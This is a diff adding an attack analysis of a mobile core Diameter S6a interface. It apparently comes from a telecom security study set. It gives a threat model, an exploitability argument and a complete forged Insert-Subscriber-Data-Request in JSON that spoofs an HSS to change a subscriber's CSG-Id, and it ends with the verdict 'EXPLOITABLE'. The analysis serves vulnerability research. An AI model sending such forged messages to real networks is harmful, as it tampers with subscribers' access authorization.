@@ -1,0 +1,117 @@
+### **Threat Model:**
+- **Attack Assumption:**  
+  The S6a interface of an MME is exposed to the Internet due to misconfiguration. The attacker impersonates an HSS, establishes an unauthenticated Diameter connection to the MME, and sends a forged **Insert-Subscriber-Data-Request** for a known subscriber. The target AVP is the nested leaf **`Subscription-Data.CSG-Subscription-Data.CSG-Id`**.
+
+- **Attacker Capability:**  
+  The attacker can send exactly one crafted **Insert-Subscriber-Data-Request** and passively receive the corresponding **Insert-Subscriber-Data-Answer**.
+
+### **Exploitability Analysis:**
+`CSG-Id` in this context is a true provisioning selector inside authoritative subscriber profile data, not passive metadata.
+
+The message is **HSS -> MME** subscriber-data provisioning on **S6a** using Diameter command **319** and application-id **16777251**. The target field is not top-level; it is the leaf AVP inside the grouped path:
+
+- `Subscription-Data`
+  - `CSG-Subscription-Data`
+    - `CSG-Id`
+
+A compliant MME that accepts the forged **Insert-Subscriber-Data-Request** parses `Subscription-Data`, then processes each `CSG-Subscription-Data` entry as part of the subscriber's stored profile. Within that grouped entry, **`CSG-Id` identifies which Closed Subscriber Group record the companion subscription attributes apply to**. Because `CSG-Subscription-Data` is effectively per-entry and repeatable, `CSG-Id` is the key that selects the affected record.
+
+This is field-specific state impact, not just generic "IDR causes an update" impact:
+
+- changing `CSG-Id` changes **which CSG authorization record** is created, updated, or mis-associated in the MME;
+- the stored state is durable in the subscriber context until later overwrite, detach, or context removal;
+- later CSG/hybrid-cell access-control and mobility handling consumes that stored CSG record.
+
+The realistic consequence is limited but real: the MME may subsequently treat the subscriber as authorized or unauthorized for the wrong CSG when handling mobility or access involving CSG/hybrid cells. That can cause:
+- incorrect CSG authorization state for one subscriber,
+- denial of access to the intended CSG cell,
+- misauthorization relative to a different CSG entry,
+- localized mobility/service issues in deployments that actually use CSG/hybrid access control.
+
+This effect is specifically attributable to `CSG-Id`, because that AVP determines the identity of the CSG entry being provisioned. Without changing `CSG-Id`, the same grouped companion data would apply to a different CSG record. So this leaf AVP materially changes the operational meaning of the stored profile entry.
+
+Caveats:
+- impact is CSG-specific, not general EPS attach/APN/bearer control;
+- if the operator does not use CSG/hybrid-cell features, practical harm may be negligible;
+- a later legitimate HSS update can overwrite the spoofed record.
+
+### **Attack Procedure:**
+The attacker crafts a minimal **Insert-Subscriber-Data-Request** with valid S6a application identifiers and mandatory routing/session AVPs, includes `Subscription-Data` with one `CSG-Subscription-Data` grouped entry, and sets **`CSG-Id`** to an attacker-chosen valid CSG identifier for the target subscriber.
+
+The attacker sends the request to the victim MME. Success is that the MME accepts the request and stores or updates the subscriber's CSG-related subscription entry under the attacker-chosen `CSG-Id`, causing later CSG access-control checks to use the wrong CSG record.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "request": true,
+    "proxiable": true,
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "hss.attacker.net;1717670001;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avps": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avps": [
+        {
+          "avp_name": "CSG-Subscription-Data",
+          "grouped_avps": [
+            {
+              "avp_name": "CSG-Id",
+              "avp_value": 555001
+            },
+            {
+              "avp_name": "Expiration-Date",
+              "avp_value": "2030-12-31T23:59:59Z"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+### **Classification:**
+`EXPLOITABLE`
